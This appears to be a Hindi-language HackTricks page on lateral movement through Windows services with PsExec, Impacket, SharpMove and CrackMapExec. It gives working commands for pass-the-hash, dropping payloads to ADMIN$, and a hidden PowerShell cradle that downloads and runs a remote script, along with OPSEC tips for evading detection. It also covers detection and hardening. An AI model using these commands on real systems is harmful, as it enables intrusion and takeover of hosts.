# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## ये कैसे काम करते हैं

ये तकनीकें किसी टार्गेट होस्ट पर कमांड चलाने के लिए SMB/RPC के ज़रिए Windows Service Control Manager (SCM) का रिमोटली दुरुपयोग करती हैं। सामान्य प्रक्रिया इस प्रकार है:

1. टार्गेट पर authenticate करें और SMB (TCP/445) के ज़रिए ADMIN$ share तक पहुँचें।
2. कोई executable कॉपी करें या ऐसी LOLBAS command line निर्दिष्ट करें जिसे service चलाएगी।
3. SCM (MS-SCMR over \PIPE\svcctl) के ज़रिए रिमोटली एक service बनाएँ, जो उस command या binary की ओर इंगित करे।
4. payload चलाने के लिए service शुरू करें और वैकल्पिक रूप से named pipe के ज़रिए stdin/stdout कैप्चर करें।
5. service रोकें और सफ़ाई करें (service और छोड़ी गई binaries को हटाएँ)।

आवश्यकताएँ/पूर्वापेक्षाएँ:
- टार्गेट पर Local Administrator (SeCreateServicePrivilege) या टार्गेट पर service बनाने के स्पष्ट अधिकार।
- SMB (445) reachable हो और ADMIN$ share उपलब्ध हो; host firewall के ज़रिए Remote Service Management की अनुमति हो।
- UAC Remote Restrictions: local accounts के साथ, token filtering नेटवर्क पर admin access को रोक सकती है, जब तक कि built-in Administrator या LocalAccountTokenFilterPolicy=1 का उपयोग न किया जाए।
- Kerberos बनाम NTLM: hostname/FQDN का उपयोग करने से Kerberos सक्षम होता है; IP से कनेक्ट करने पर अक्सर NTLM का उपयोग होता है (और hardened environments में इसे ब्लॉक किया जा सकता है)।

### sc.exe के ज़रिए Manual ScExec/WinExec

नीचे service बनाने का एक न्यूनतम तरीका दिखाया गया है। service image, छोड़ी गई EXE या cmd.exe अथवा powershell.exe जैसी LOLBAS हो सकती है।

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

नोट्स:
- गैर-service EXE शुरू करते समय timeout error आने की अपेक्षा रखें; execution फिर भी होता है।
- OPSEC के लिहाज़ से अधिक सुरक्षित रहने के लिए, fileless commands (cmd /c, powershell -enc) को प्राथमिकता दें या छोड़े गए artifacts को हटा दें।

अधिक विस्तृत चरण यहां देखें: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## टूलिंग और उदाहरण

### Sysinternals PsExec.exe

- क्लासिक admin tool, जो SMB का उपयोग करके ADMIN$ में PSEXESVC.exe छोड़ता है, एक temporary service (डिफ़ॉल्ट नाम PSEXESVC) इंस्टॉल करता है, और named pipes के ज़रिए I/O को प्रॉक्सी करता है।
- उपयोग के उदाहरण:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- आप WebDAV के ज़रिए Sysinternals Live से सीधे लॉन्च कर सकते हैं:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Service install/uninstall events छोड़ता है (यदि `-r` का उपयोग न किया जाए, तो Service name अक्सर PSEXESVC होता है) और execution के दौरान `C:\Windows\PSEXESVC.exe` बनाता है।

### Impacket psexec.py (PsExec-like)

- Embedded RemCom-like service का उपयोग करता है। `ADMIN$` के ज़रिए एक transient service binary (आमतौर पर random नाम वाली) छोड़ता है, एक service बनाता है (अक्सर default नाम RemComSvc होता है) और named pipe पर I/O को proxy करता है।

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

आर्टिफैक्ट्स
- C:\Windows\ में अस्थायी EXE (8 रैंडम अक्षर)। ओवरराइड न किए जाने पर Service name डिफ़ॉल्ट रूप से RemComSvc होता है।

### Impacket smbexec.py (SMBExec)

- एक अस्थायी service बनाता है, जो cmd.exe शुरू करती है और I/O के लिए named pipe का उपयोग करती है। आम तौर पर पूरा EXE payload drop करने से बचता है; command execution semi-interactive होता है।

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral और SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) service-based exec सहित कई lateral movement methods लागू करता है।

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) में दूरस्थ रूप से command निष्पादित करने के लिए service में बदलाव/निर्माण की सुविधा शामिल है।

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- आप अलग-अलग backends (psexec/smbexec/wmiexec) के ज़रिए execute करने के लिए CrackMapExec का भी उपयोग कर सकते हैं:

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, detection और artifacts

PsExec जैसी techniques का उपयोग करते समय आम host/network artifacts:
- उपयोग किए गए admin account के लिए target पर Security 4624 (Logon Type 3) और 4672 (Special Privileges)।
- Security 5140/5145 File Share और File Share Detailed events, जिनमें ADMIN$ access और service binaries (जैसे PSEXESVC.exe या random 8-char .exe) को create/write करना दिखता है।
- Target पर service installation के लिए Service Control Manager का **System** 7045: PSEXESVC, RemComSvc या custom (`-r` / `-service-name`) जैसे नाम। इससे यह साबित होता है कि service install हुई थी, यह नहीं कि उसकी image चली थी। उपलब्ध होने पर इसके timestamp और image path का process events या matching service-image prefetch entry से मिलान करें।<sup>[[4]](#references)</sup>
- services.exe या service image के लिए Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ में 11 (File Create), और \\.\pipe\psexesvc, \\.\pipe\remcom_* या random equivalents जैसी pipes के लिए 17/18 (Pipe Created/Connected)।
- Sysinternals EULA का Registry artifact: operator host पर HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (अगर इसे suppress न किया गया हो)।

Hunting के सुझाव
- उन service installs पर alert करें जिनके ImagePath में cmd.exe /c, powershell.exe या TEMP locations शामिल हों।
- ऐसी process creations खोजें जिनमें ParentImage C:\Windows\PSEXESVC.exe हो, या services.exe के child processes LOCAL SYSTEM के रूप में shells चला रहे हों।
- -stdin/-stdout/-stderr पर खत्म होने वाली named pipes या आम PsExec clone pipe names को flag करें।

## आम समस्याओं का निवारण
- Services बनाते समय Access is denied (5): संभव है कि अकाउंट वास्तव में local admin न हो, local accounts के लिए UAC remote restrictions लागू हों, या EDR service binary path पर tampering protection लागू कर रहा हो।
- The network path was not found (53) या connect नहीं हो सका: firewall SMB/RPC को block कर रहा है या admin shares disabled हैं।
- Kerberos विफल होता है, लेकिन NTLM blocked है: hostname/FQDN से connect करें (IP से नहीं), सही SPNs सुनिश्चित करें, या Impacket इस्तेमाल करते समय tickets के साथ -k/-no-pass दें।
- Service start timeout हो जाता है, लेकिन payload चल गया: अगर यह असली service binary नहीं है, तो यह अपेक्षित है; output को file में capture करें या live I/O के लिए smbexec इस्तेमाल करें।

## Hardening से जुड़े सुझाव
- Windows 11 24H2 और Windows Server 2025 में outbound connections (और Windows 11 में inbound connections) के लिए SMB signing default रूप से आवश्यक है। इससे valid creds के साथ वैध PsExec उपयोग नहीं टूटता, लेकिन unsigned SMB relay abuse रुकता है और उन devices पर असर पड़ सकता है जो signing support नहीं करते।<sup>[[2]](#references)</sup>
- नया SMB client NTLM blocking (Windows 11 24H2/Server 2025) IP या non-Kerberos servers से connect करते समय NTLM fallback को रोक सकता है। Hardened environments में इससे NTLM-आधारित PsExec/SMBExec काम नहीं करेगा; Kerberos (hostname/FQDN) इस्तेमाल करें या वैध आवश्यकता होने पर exceptions configure करें।<sup>[[2]](#references)</sup>
- Least privilege का सिद्धांत: local admin membership कम से कम रखें, Just-in-Time/Just-Enough Admin को प्राथमिकता दें, LAPS लागू करें, और 7045 service installs पर monitor/alert करें।

## यह भी देखें

- WMI-आधारित remote exec (अक्सर अधिक fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-आधारित remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 और Windows 11 में SMB security hardening](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Windows Boxes पर कब्ज़ा करने के लिए Credentials का उपयोग - भाग 2 (PSExec और Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – System event logs का उपयोग करके unexpected reboots का निवारण](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
